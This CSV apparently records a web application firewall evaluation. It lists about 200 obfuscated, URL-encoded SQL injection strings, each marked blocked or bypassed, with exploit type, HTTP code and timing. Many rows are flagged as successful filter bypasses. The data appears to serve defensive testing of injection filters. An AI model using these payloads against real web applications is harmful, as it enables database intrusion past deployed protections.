Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0%27<@=1.%0b||%0bnot+{a+1}=1=%0b(not+{x%0b(select+1)}=1)--,Bypassed,Yes,unionAtk,piggyAtk,0.0074,71.75,No,200
0'<@!=1.+or+not+{x+(select%0b1)}=1=+(not+{x%0b(select+1)}=1),Blocked,No,None,Unknown,0.007,71.95,No,403
1%27+||%0b{x%0b(select+1)}=1%0blike%0b{a+1}=1%0b||%270,Blocked,No,None,Unknown,0.0143,71.95,No,403
0'<@=1%0b||%0b{`if`%0b1}=1+like+{`if`+1}=1%0bor',Bypassed,No,None,Unknown,0.0301,71.95,No,500
0%27<@=1.%0bor+{`if`+1}=1%0blike%0b1%0b||',Bypassed,No,None,Unknown,0.021,71.95,No,500
0%27<@=.1%0bor+not%0b{a%0b1}=1=+(not+{x%0b(select%0b1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0137,71.95,No,200
0%27<@!=.1%0b||%0b!+1=+(not~false)+||%27,Bypassed,Yes,unionAtk,Unknown,0.012,72.12,No,200
0%27<@=1+or%0b!%0b{x+(select%0b1)}=1=%0b(!%0b1)+||',Blocked,No,None,Unknown,0.0169,72.3,No,403
0'<@!=1+or+not+{x+(select%0b1)}=1=+(not%0b{x+(select+1)}=1,Blocked,No,None,Unknown,0.013,72.3,No,403
0%27<@!=1.+||+!+{x%0b(select+1)}=1=+(not+{x%0b(select%0b1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0147,72.3,No,200
0'<@!=1+or%0b!%0b{a+1}=1=+(!+{`if`%0b1}=1)--%0b,Bypassed,No,None,piggyAtk,0.0274,71.28,No,500
0'<@=.1+or%0b!+{x+(select+1)}=1=+(!%0b{`if`%0b1}=1)%0b,Blocked,No,None,Unknown,0.0123,71.28,No,403
0%27<@!=.1+or+{x%0b(select+1)}=1%0blike%0b{a%0b1}=1%0bor',Bypassed,No,None,Unknown,0.0134,71.28,No,500
0'<@!=.1+||+not+{x+(select%0b1)}=1=%0b(not+true)+||%27,Blocked,No,None,Unknown,0.0135,71.28,No,403
0'<@=1.%0b||+not%0b{`if`+1}=1=%0b(not+{x%0b(select+1)}=1)%23,Bypassed,No,None,piggyAtk,0.0231,71.39,No,500
0%27<@!=1%0bor%0b{x%0b(select%0b1)}=1%0blike+{x+(select+1)}=1%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0115,71.51,No,200
0%27||+@<@.+or%0b{x+(select+1)}=1%0blike+{x+(select+1)}=1+||%27,Blocked,No,None,Unknown,0.0067,71.51,No,403
0%27<@=1.%0b||+not+{`if`+1}=1=%0b(not+{`if`+1}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.018,71.51,No,200
0%27<@=1+||%0bnot+1=%0b(not+{x+(select%0b1)}=1)%0bor',Bypassed,No,None,Unknown,0.0095,71.51,No,500
0'<@=.1+or+not+{x%0b(select%0b1)}=1=+(!+{x+(select%0b1)}=1),Bypassed,No,None,Unknown,0.0131,71.51,No,500
0'<@!=1.+or+not%0b{x+(select+1)}=1=%0b(not+{a+1}=1)%0b,Bypassed,No,None,Unknown,0.021,71.51,No,500
0'or+@<@.%0b||+1%0blike+{x%0b(select%0b1)}=1+or',Bypassed,No,None,Unknown,0.0143,71.51,No,500
0%27<@=1.%0b||+not~false=+(not+{`if`+1}=1)%0bor%27,Bypassed,Yes,unionAtk,booleanAtk,0.0191,71.51,No,200
0%27<@=.1+or+not+true=%0b(false)%0b||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0378,71.51,No,200
0%27<@!=1+or+!%7e0=%0b(not+1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0152,71.51,No,200
0'<@=1.+||%0bfalse=+(0)%0b||%27,Bypassed,No,None,Unknown,0.0137,71.51,No,500
0'<@=1.+or+{x+(select%0b1)}=1%0blike%0b{x+(select%0b1)}=1%23,Blocked,No,None,piggyAtk,0.0219,71.51,No,403
0%27<@=1%0bor+not%0b{`if`%0b1}=1=%0b(not+{`if`+1}=1)%0b||',Bypassed,No,None,Unknown,0.0286,71.51,No,500
0%27<@!=1.+||%0b!%0b{a%0b1}=1=+(!%0b{x+(select+1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.021,71.51,No,200
0%27<@=.1%0bor%0bnot%0b{x%0b(select+1)}=1=%0b(not%0b{x+(select%0b1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0246,71.51,No,200
0'<@!=1.+or%0bnot%0b{x%0b(select%0b1)}=1=+(not%0b{x%0b(select+1)}=1),Blocked,No,None,Unknown,0.012,71.51,No,403
0'<@=1%0bor%0bnot+{x+(select%0b1)}=1=+(!+{x%0b(select+1)}=1),Bypassed,No,None,Unknown,0.0113,71.51,No,500
0'<@!=1.+||+not+{x%0b(select+1)}=1=+(not%0b{`if`+1}=1)%0b,Bypassed,No,None,Unknown,0.0185,71.51,No,500
0'<@!=.1%0b||%0b!%7efalse=%0b(not%0b{a+1}=1)+or',Bypassed,No,None,booleanAtk,0.0254,71.51,No,500
0'<@!=1%0bor%0bnot%0b1=+(not+{x+(select%0b1)}=1)+or%27,Bypassed,No,None,Unknown,0.0114,71.51,No,500
0%27<@!=1+or%0bnot+{`if`+1}=1=+(not+1)+||',Bypassed,No,None,Unknown,0.0243,71.51,No,500
0'<@!=1+||%0bnot%0b{x%0b(select%0b1)}=1=%0b(!%0btrue)+or',Blocked,No,None,booleanAtk,0.0086,71.51,No,403
0'<@=.1%0bor+!%7efalse=%0b(not+{x+(select+1)}=1)+||',Bypassed,No,None,booleanAtk,0.0105,71.51,No,500
0'or%0b!@<@+or%0b!+{`if`%0b1}=1=+(not%0b{`if`%0b1}=1)%0b,Bypassed,No,None,Unknown,0.0145,71.51,No,500
0%27<@=.1%0bor+not+{x+(select%0b1)}=1=%0b(!%0btrue)+||',Bypassed,No,None,booleanAtk,0.023,71.51,No,500
0%27<@!=.1+or+!%0b{a+1}=1=+(not+{x+(select+1)}=1)+,Blocked,No,None,Unknown,0.0064,71.51,No,403
0'<@!=1.+or+not%0b{x+(select+1)}=1=+(not%0b{`if`+1}=1)%0b,Bypassed,No,None,Unknown,0.017,71.51,No,500
0%27<@!=1.%0bor+!+true=%0b(not+{`if`%0b1}=1)%0bor',Bypassed,No,None,booleanAtk,0.0257,71.51,No,500
0%27<@!=1+or%0bnot~0=+(!%0b{x%0b(select+1)}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0156,71.63,No,200
0%27<@=1.%0bor%0b!%0b{x+(select%0b1)}=1=+(not+{`if`+1}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0116,71.75,No,200
0'<@=1+or+{`if`+1}=1%0blike+{x+(select+1)}=1+or%27,Bypassed,No,None,Unknown,0.0226,71.75,No,500
0%27<@=1.+||+!+{x+(select+1)}=1=+(not%0b{`if`+1}=1)+,Blocked,No,None,Unknown,0.0128,71.75,No,403
0%27<@!=.1%0b||+not~false=%0b(!%0b1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0152,71.75,No,200
0'<@!=1%0b||%0b!+{x+(select%0b1)}=1=%0b(not%0b{x+(select+1)}=1),Bypassed,No,None,Unknown,0.0108,71.75,No,500
0%27<@!=1.%0bor+!%0b{x%0b(select+1)}=1=+(!+{x+(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0229,71.75,No,200
0'<@!=1+or%0b!+{x%0b(select+1)}=1=+(!+true)%0b||%27,Bypassed,No,None,booleanAtk,0.0134,71.79,No,500
0%27<@!=1+or%0b%7e+{`if`+1}=1=%0b(%7e+{x%0b(select+1)}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0138,71.95,No,200
0'<@!=.1%0bor%0b!%0b{x+(select+1)}=1=+(0)--%0b,Bypassed,No,None,piggyAtk,0.0153,71.95,No,500
0%27<@=1.%0bor%0b!+{`if`+1}=1=+(not+{`if`+1}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.024,71.95,No,200
0%27<@!=.1%0bor+not~0=%0b(not+{a%0b1}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.029,71.95,No,200
0'or%0b@<@.%0b||+not+{x+(select%0b1)}=1=+(not+{a+1}=1,Bypassed,No,None,Unknown,0.0285,72.12,No,500
0%27or+@<@.%0b||%0b!+1=%0b(!%0b{x+(select+1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0227,72.3,No,200
0'<@=1.+||%0bnot%0b1=%0b(not%0b1)%0b||%27,Bypassed,No,None,Unknown,0.018,72.3,No,500
0'<@=1.+or+{`if`%0b1}=1+like%0b{x+(select+1)}=1+or%27,Bypassed,No,None,Unknown,0.0207,72.3,No,500
0'<@!=1+||+not+{x%0b(select%0b1)}=1=%0b(!+true)%0bor',Bypassed,No,None,booleanAtk,0.0199,72.3,No,500
0'<@=1.+or%0b!+{x%0b(select+1)}=1=+(not+{x+(select+1)}=1),Bypassed,No,None,Unknown,0.0404,71.95,No,500
0%27<@!=1+||%0bnot+true=%0b(not+{a+1}=1)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0191,71.95,No,200
0%27<@=1.+||+not%0b1=+(not~false)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0202,72.12,No,200
0'<@!=1%0b||%0b{x%0b(select+1)}=1+like+{x+(select%0b1)}=1+||',Bypassed,No,None,Unknown,0.0263,72.3,No,500
0%27<@!=1.+or%0bnot+true=+(!%0b{x+(select%0b1)}=1)%0b||%27,Bypassed,Yes,unionAtk,booleanAtk,0.025,72.3,No,200
0%27<@=1+or+!+true=+(!+true)+||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0155,72.3,No,200
0%27<@!=.1%0b||%0b!+{x+(select%0b1)}=1=%0b(not%0b{x+(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0363,72.3,No,200
0%27<@=1+or+1+like+{x+(select%0b1)}=1--%0b,Blocked,No,None,piggyAtk,0.0153,72.3,No,403
0'<@!=1.%0bor%0b{`if`+1}=1%0blike%0b{`if`+1}=1%0b||%27,Bypassed,No,None,Unknown,0.017,72.3,No,500
0'<@=1.%0bor%0bnot+{`if`+1}=1=+(!%0b{`if`+1}=1)--%0b,Bypassed,No,None,piggyAtk,0.0162,72.3,No,500
0'<@!=1.+or+!+{x+(select+1)}=1=+(!%7efalse)+or%27,Blocked,No,None,booleanAtk,0.0121,72.3,No,403
0%27<@=1%0b||%0b!+{x+(select%0b1)}=1=%0b(!+{x+(select%0b1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0264,72.3,No,200
0%27<@=1+||+not%0b{x%0b(select+1)}=1=+(not%0b{x%0b(select%0b1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0213,72.3,No,200
0'<@!=.1+or+!+{`if`+1}=1=+(not%0b{`if`+1}=1)+||%27,Bypassed,No,None,Unknown,0.0159,72.3,No,500
0%27<@=.1%0bor+!%0b{x%0b(select%0b1)}=1=+(not+{x+(select+1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0176,72.3,No,200
0%27<@!=.1%0b||+not%0b{x+(select+1)}=1=%0b(!+{x%0b(select%0b1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0208,72.3,No,200
0%27<@!=.1%0b||%0b{`if`+1}=1+like+{x%0b(select%0b1)}=1%23,Bypassed,Yes,unionAtk,piggyAtk,0.0214,72.3,No,200
0%27<@=1.+or%0b0=%0b(not~0)%0b||',Bypassed,No,None,Unknown,0.009,72.3,No,500
0%27<@=.1+||+not+{a%0b1}=1=+(!+{x%0b(select+1)}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0135,72.3,No,200
0'<@!=1.%0bor+!%0b{x+(select+1)}=1%0bis%0bfalse+||%27,Bypassed,No,None,booleanAtk,0.0127,72.3,No,500
0'<@=1+or+!%0b{`if`%0b1}=1=%0b(!%0b{x+(select%0b1)}=1)+,Bypassed,No,None,Unknown,0.0238,72.3,No,500
0'<@!=1%0b||+!+1=+(not+{x%0b(select+1)}=1)+||',Bypassed,No,None,Unknown,0.021,72.3,No,500
0'<@=.1+||+not+{x%0b(select+1)}=1=%0b(not+{`if`+1}=1)--,Bypassed,No,None,piggyAtk,0.0175,72.3,No,500
0'<@=1.+or%0btrue%0blike%0b1+or',Bypassed,No,None,booleanAtk,0.0137,72.3,No,500
0'<@!=.1%0b||+not%0b{`if`%0b1}=1+is+false--%0b,Bypassed,No,None,piggyAtk,0.0262,72.3,No,500
0'||+1<@.+||+not%0b{x+(select%0b1)}=1=+(!%0b{x%0b(select,Bypassed,No,None,Unknown,0.0154,72.3,No,500
0%27<@!=.1+or+not%0b{x%0b(select%0b1)}=1=%0b(!~false)%0bor%27,Bypassed,Yes,unionAtk,booleanAtk,0.0245,72.3,No,200
0%27<@=.1%0b||+!%0b{x%0b(select%0b1)}=1=+(not+{`if`+1}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0121,72.3,No,200
0%27<@=.1%0b||%0b!+{`if`+1}=1=+(!~0)+or',Bypassed,No,None,Unknown,0.0231,72.3,No,500
0'<@=.1%0b||+!%0b1=+(!+{a%0b1}=1)+||%27,Bypassed,No,None,Unknown,0.023,72.3,No,500
0%27<@!=1%0bor%0b!+{x%0b(select+1)}=1=%0b(not+1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0268,72.3,No,200
0'<@!=1.%0bor+not+{`if`+1}=1=%0b(!+{x%0b(select%0b1)}=1)%0b,Bypassed,No,None,Unknown,0.0243,72.3,No,500
0'or%0b@<@.%0bor+not+{`if`+1}=1=%0b(!+{x%0b(select+1)}=1,Bypassed,No,None,Unknown,0.0254,72.3,No,500
0%27<@!=1.+or+{x+(select+1)}=1+like%0b{x+(select+1)}=1--+,Blocked,No,None,piggyAtk,0.0166,72.3,No,403
0'<@=.1%0b||%0bnot+{x+(select%0b1)}=1=%0b(not%0b{`if`+1}=1)%23,Bypassed,No,None,piggyAtk,0.0159,72.3,No,500
0'<@=1.%0b||+not%0b{x+(select%0b1)}=1=%0b(not%0b{a+1}=1)%23,Bypassed,No,None,piggyAtk,0.0144,72.3,No,500
0%27<@!=1.+or+not%0b1=%0b(!%0b1)+or',Bypassed,No,None,Unknown,0.0183,72.3,No,500
0'<@=1%0bor%0bnot+1=+(not+true)+||',Bypassed,No,None,booleanAtk,0.0172,72.3,No,500
0'<@=.1+or+{x+(select%0b1)}=1+like+1%0b||',Blocked,No,None,Unknown,0.0078,72.3,No,403
0%27<@!=1%0bor+false=+(!%0b{`if`%0b1}=1)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0157,72.3,No,200
0%27<@!=1.+or+not+{a%0b1}=1=%0b(!+{`if`+1}=1)%0b||',Bypassed,No,None,Unknown,0.0089,72.3,No,500
0'<@=1+||+not+{x%0b(select%0b1)}=1=+(not%0b{`if`%0b1}=1)+,Bypassed,No,None,Unknown,0.0134,72.3,No,500
0%27<@=.1%0b||%0bnot%0b{`if`+1}=1=+(!+{x+(select+1)}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0156,72.3,No,200
0%27<@!=1.+or+!+{x+(select%0b1)}=1=+(!+{a%0b1}=1)%0b,Blocked,No,None,Unknown,0.0105,72.3,No,403
0'<@!=1.%0bor+!%7efalse=%0b(not%0b{x+(select%0b1)}=1)--%0b,Bypassed,No,None,piggyAtk,0.0144,72.3,No,500
0%27<@=1+or+not%0b{x+(select+1)}=1=+(not+1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0238,72.3,No,200
0'<@!=1+||+{a+1}=1+like+{x%0b(select+1)}=1+or',Bypassed,No,None,Unknown,0.0121,72.3,No,500
0'<@=1%0b||+not+{x+(select+1)}=1=+(not+1)+or%27,Bypassed,No,None,Unknown,0.0142,72.32,No,500
0%27<@!=.1+or%0b0=+(!%0b{x+(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0167,72.33,No,500
0'<@!=1.+||+not+{x+(select+1)}=1=%0b(not%0btrue)+||',Blocked,No,None,Unknown,0.0113,72.33,No,403
0%27<@!=1+or%0bnot+{`if`%0b1}=1=+(!%0b{x+(select%0b1)}=1)--,Bypassed,Yes,unionAtk,piggyAtk,0.0136,71.95,No,200
0'<@!=.1+or+!%0b{x%0b(select%0b1)}=1=+(not%0b{x%0b(select+1)}=1),Bypassed,No,None,Unknown,0.0187,71.95,No,500
0%27<@=.1+or+not~false=+(not+{x%0b(select%0b1)}=1)%0bor',Bypassed,No,None,booleanAtk,0.01,71.95,No,500
0'<@!=1+||%0b!+{x%0b(select+1)}=1=+(not+{a+1}=1)+,Bypassed,No,None,Unknown,0.0102,72.24,No,500
0'<@!=1%0bor+!%0b{a+1}=1=+(not+{a+1}=1)+||%27,Bypassed,No,None,Unknown,0.0247,72.3,No,500
0%27or+1<@+||%0bnot+{x+(select%0b1)}=1=+(not%0b{a%0b1}=1,Blocked,No,None,Unknown,0.0212,72.3,No,403
0%27<@!=.1+or+{a+1}=1+like%0b1+or',Bypassed,No,None,Unknown,0.0187,72.3,No,500
0%27<@=.1+||+not%0b{x+(select+1)}=1=%0b(!+{a%0b1}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0254,72.3,No,200
0%27<@!=.1%0bor%0bnot%0b1=%0b(!+{x+(select%0b1)}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0098,72.3,No,200
0'<@=.1%0bor%0bnot+{x%0b(select%0b1)}=1=%0b(not+{`if`+1}=1)--,Bypassed,No,None,piggyAtk,0.0157,72.3,No,500
0%27<@=1+or+not%7e0=+(not%0b{`if`%0b1}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.014,72.3,No,200
0%27<@=.1%0bor+!%0b{`if`%0b1}=1=%0b(!+{x%0b(select+1)}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0174,72.3,No,200
0%27<@!=1%0b||+not%0b1=%0b(!+{x%0b(select+1)}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0255,72.3,No,200
0'<@!=1.%0bor+not+{a+1}=1=+(!+{x+(select+1)}=1)--,Bypassed,No,None,piggyAtk,0.0181,72.3,No,500
0%27or%0b@<@.%0b||+!+1=%0b(not+{x+(select+1)}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0159,72.3,No,200
0%27<@=.1%0bor%0bnot%0b{a+1}=1=+(!%0b1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0174,72.3,No,200
0%27<@!=1.+||+not+true=%0b(false)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0116,72.3,No,200
0%27<@!=.1%0b||%0b!%0b{`if`%0b1}=1=%0b(not%0b{`if`+1}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0157,72.3,No,200
0%27<@!=1+or+not+{x+(select%0b1)}=1=%0b(!%0b{a+1}=1)+,Blocked,No,None,Unknown,0.0077,72.3,No,403
0%27<@=.1%0bor+!%0b{a+1}=1=+(not%0b{x+(select%0b1)}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0161,72.3,No,200
0'<@=.1+||%0bnot+{x%0b(select+1)}=1=+(!+{a+1}=1)+,Bypassed,No,None,Unknown,0.0238,72.3,No,500
0%27<@!=1.%0bor%0b!+{`if`+1}=1=+(!+{x+(select+1)}=1)--,Bypassed,Yes,unionAtk,piggyAtk,0.0191,72.3,No,200
0%27<@=.1+||+!%0btrue=%0b(not%0b{x+(select%0b1)}=1)%0bor',Bypassed,No,None,booleanAtk,0.024,72.3,No,500
0%27<@=1.+or+not~0=%0b(!%0b{a+1}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0333,72.3,No,200
0%27<@!=1+or+not+{`if`+1}=1=%0b(not+{x+(select%0b1)}=1)--,Bypassed,Yes,unionAtk,piggyAtk,0.0214,72.3,No,200
0%27<@=1%0b||+{`if`+1}=1+like+{`if`%0b1}=1%0bor',Bypassed,No,None,Unknown,0.014,72.3,No,500
0%27<@=1.%0b||+!%0b{x+(select%0b1)}=1=%0b(not%0b{`if`%0b1}=1)+,Bypassed,Yes,unionAtk,Unknown,0.0186,72.3,No,200
0'<@!=1%0bor%0bnot+{x%0b(select+1)}=1=+(!+{x%0b(select+1)}=1,Bypassed,No,None,Unknown,0.0144,72.3,No,500
0'<@=1.+or%0b!+{x+(select+1)}=1=%0b(!+{x+(select+1)}=1),Blocked,No,None,Unknown,0.0113,72.3,No,403
0'<@!=.1%0b||%0b!+{x%0b(select%0b1)}=1=+(not+true)%0bor',Bypassed,No,None,booleanAtk,0.0187,72.3,No,500
0%27<@=1.%0b||%0b!%0b{x+(select%0b1)}=1=%0b(!~0)%0bor',Bypassed,No,None,Unknown,0.0298,72.3,No,500
0%27<@=1.+or+!%0b1=+(not%0b{x+(select+1)}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0138,72.3,No,200
0%27<@=.1%0bor%0b!+{`if`+1}=1=%0b(not+true)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0181,72.3,No,200
0%27<@!=1.%0b||%0bnot+{a+1}=1=+(not+{x%0b(select%0b1)}=1)--,Bypassed,Yes,unionAtk,piggyAtk,0.0116,72.3,No,200
0%27<@=1+or+{`if`+1}=1+like+{`if`%0b1}=1+or%27,Bypassed,Yes,unionAtk,Unknown,0.0247,72.3,No,200
0%27<@=.1+or+not+{x+(select%0b1)}=1=+(!~0)+or',Blocked,No,None,Unknown,0.0079,72.3,No,403
0%27<@=1.+or%0b!%0b{x+(select%0b1)}=1=%0b(0)%23,Blocked,No,None,piggyAtk,0.0073,72.3,No,403
0%27<@!=1+or+!~0=+(false)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0148,72.3,No,200
0'<@!=1+or%0b{x%0b(select+1)}=1%0blike+{x%0b(select+1)}=1+or',Bypassed,No,None,Unknown,0.0168,72.3,No,500
0'<@!=.1+or+!+{`if`+1}=1=%0b(!+{x%0b(select+1)}=1)%0b,Bypassed,No,None,Unknown,0.0245,72.3,No,500
0%27<@=.1+or%0bnot%0b1=+(not~false)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0234,72.3,No,200
0%27<@!=1%0bor%0bnot+{x+(select%0b1)}=1=+(!%0b{`if`+1}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0178,72.3,No,200
0%27<@=1.%0b||+false=+(!+{x+(select%0b1)}=1)%0bor',Bypassed,No,None,booleanAtk,0.0202,72.3,No,500
0%27<@!=1.%0bor%0b!+{a+1}=1=+(not%7efalse)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0164,72.3,No,200
0'<@!=1.+or+!+1=+(!%0b{`if`+1}=1)%0b||%27,Bypassed,No,None,Unknown,0.0189,72.3,No,500
0%27<@!=.1%0bor%0b1%0blike+{`if`%0b1}=1+||',Bypassed,No,None,Unknown,0.0117,72.3,No,500
0%27<@=.1+||+!%0b{x+(select+1)}=1=+(not+{x%0b(select%0b1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0112,72.3,No,200
0%27<@=.1+or%0bfalse=+(not%0b{x+(select+1)}=1)%0b||',Bypassed,No,None,booleanAtk,0.0161,72.3,No,500
0'<@!=1%0bor+!+{x%0b(select+1)}=1=+(!%0b{x%0b(select%0b1)}=1),Bypassed,No,None,Unknown,0.0129,72.3,No,500
0'<@!=1.%0bor+!%0b1=+(!%0b{x+(select+1)}=1)%0b||%27,Bypassed,No,None,Unknown,0.0145,72.3,No,500
0%27<@!=1.+or+not+{x+(select%0b1)}=1=+(!+{x+(select%0b1)}=1),Blocked,No,None,Unknown,0.0132,72.12,No,403
0%27<@!=1%0b||+!%0b{`if`+1}=1=+(!+{a+1}=1)%0b||',Bypassed,No,None,Unknown,0.0149,72.3,No,500
0'<@!=1%0bor+not~false=%0b(!~0)+||',Bypassed,No,None,booleanAtk,0.0253,72.3,No,500
0'<@!=1.%0b||+!+{a+1}=1=%0b(not%0b{x%0b(select+1)}=1)--,Bypassed,No,None,piggyAtk,0.0126,72.3,No,500
0%27<@!=.1%0b||%0btrue%0blike+{x%0b(select+1)}=1%0bor',Bypassed,No,None,booleanAtk,0.0195,72.3,No,500
0'<@!=1.%0b||%0b!%0b{x%0b(select+1)}=1=%0b(!%0b{x%0b(select+1)}=1),Bypassed,No,None,Unknown,0.011,72.3,No,500
0%27<@=.1+||+!+{x%0b(select%0b1)}=1=+(not+true)+or',Bypassed,No,None,booleanAtk,0.0148,72.3,No,500
0%27<@!=.1%0bor%0bnot+1=%0b(!%0b{`if`+1}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0214,72.3,No,200
0'<@=1.+||%0b!%0b{a+1}=1=%0b(not%0b{x+(select%0b1)}=1)--,Bypassed,No,None,piggyAtk,0.0227,72.3,No,500
0'<@=.1+||+!%0btrue=%0b(not+{x+(select+1)}=1)+or%27,Bypassed,No,None,booleanAtk,0.0098,72.3,No,500
0'<@=.1+or%0bfalse=%0b(not%0b{a+1}=1)+||%27,Bypassed,No,None,booleanAtk,0.0245,72.3,No,500
0'<@!=1.%0b||+!~0=+(!+{x+(select+1)}=1)+or%27,Bypassed,No,None,Unknown,0.0238,72.3,No,500
0'<@=1+or%0bnot+{x%0b(select%0b1)}=1=+(not+{a%0b1}=1)--,Bypassed,No,None,piggyAtk,0.0212,72.3,No,500
0%27<@=1+||+not+{x+(select+1)}=1=%0b(0)--%0b,Blocked,No,None,piggyAtk,0.0139,72.3,No,403
0%27<@!=1%0bor+!+{x%0b(select%0b1)}=1=%0b(!+{a%0b1}=1)%0b,Bypassed,Yes,unionAtk,Unknown,0.0255,72.3,No,200
0'<@=1.+or%0bnot+{x%0b(select+1)}=1=+(not%0b{a+1}=1)%0b,Bypassed,No,None,Unknown,0.0156,72.3,No,500
0%27<@=1.+||%0bnot%0b{x+(select%0b1)}=1=%0b(not+{x%0b(select%0b1)}=1),Blocked,No,None,Unknown,0.013,72.3,No,403
0%27<@!=1%0b||+!+{a%0b1}=1=%0b(!+1)+or',Bypassed,No,None,Unknown,0.0202,72.3,No,500
0%27<@!=1.+or+0=+(!%0b{a+1}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0118,72.3,No,200
0%27or+!@<@.+||%0b!+{x+(select%0b1)}=1=%0b(!%7e0)%0b,Blocked,No,None,Unknown,0.0108,72.3,No,403
0'<@=1.%0bor%0bnot+1=%0b(!+{a+1}=1)+||',Bypassed,No,None,Unknown,0.0132,72.3,No,500
0'<@=1.+or%0bnot+{x%0b(select%0b1)}=1=+(!%0b{x%0b(select%0b1)}=1),Bypassed,No,None,Unknown,0.0262,72.3,No,500
0'<@=.1+||%0bnot+{`if`+1}=1=+(not%0btrue)%0bor%27,Bypassed,No,None,booleanAtk,0.0179,72.3,No,500
0%27<@!=.1+or%0bnot+{x+(select+1)}=1=%0b(not%0b{x+(select+1)}=1),Blocked,No,None,Unknown,0.0152,72.3,No,403
0'<@=1.%0b||%0bnot%0b1=+(!%0b{x%0b(select%0b1)}=1)%0b||',Bypassed,No,None,Unknown,0.0216,72.3,No,500
0'or%0b@<@.%0bor+not%0b{a+1}=1=+(!%0b{`if`+1}=1)%0b,Bypassed,No,None,Unknown,0.0145,72.3,No,500
0'<@=1.%0bor+!%0b{x%0b(select%0b1)}=1=%0b(!%0b{a%0b1}=1)%0b,Bypassed,No,None,Unknown,0.0172,72.3,No,500
0'||%0b1<@.%0bor%0b!+{a+1}=1=+(not%0b{a+1}=1)+,Bypassed,No,None,Unknown,0.0124,72.3,No,500
0%27<@=1.%0b||%0bnot~false=%0b(not+{`if`+1}=1)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0282,72.3,No,200
0%27<@!=.1%0bor+{`if`%0b1}=1%0blike%0b{x+(select+1)}=1%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0278,72.3,No,200
